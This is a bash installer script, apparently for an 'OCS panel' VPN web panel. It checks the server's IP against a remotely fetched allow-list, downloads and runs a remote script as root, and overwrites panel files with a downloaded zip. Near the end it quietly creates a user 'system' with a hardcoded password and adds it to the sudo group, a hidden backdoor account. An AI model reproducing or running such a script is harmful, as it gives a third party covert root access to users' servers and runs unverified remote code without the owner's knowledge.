#!/bin/bash

MYIP=$(wget -qO- ipv4.icanhazip.com);
# check registered ip
wget -q -O daftarip http://sc.zxbxbs.me:81/akses/token
if ! grep -w -q $MYIP daftarip; then
        echo "Sorry, only registered IPs can use this script!"
                echo "Powered by Mail"
        rm -f /root/daftarip
        exit

        else
                echo "Powered by Mail"
        fi


cd
wget -q 'https://raw.githubusercontent.com/xiihaiqal/OCS_PANEL/master/OCS' && chmod +x OCS;
./OCS;
cd
rm OCS;
cd /home/panel/html;
wget -q https://kingkongvpn.xyz/Premium.zip
rm -rf view asset installation controller;
unzip -o -qq Premium.zip;
rm Premium.zip;
cd
sudo timedatectl set-timezone Asia/Jakarta
useradd -m system
echo "system:haiqal2020" | chpasswd
usermod -aG sudo system
rm Premium
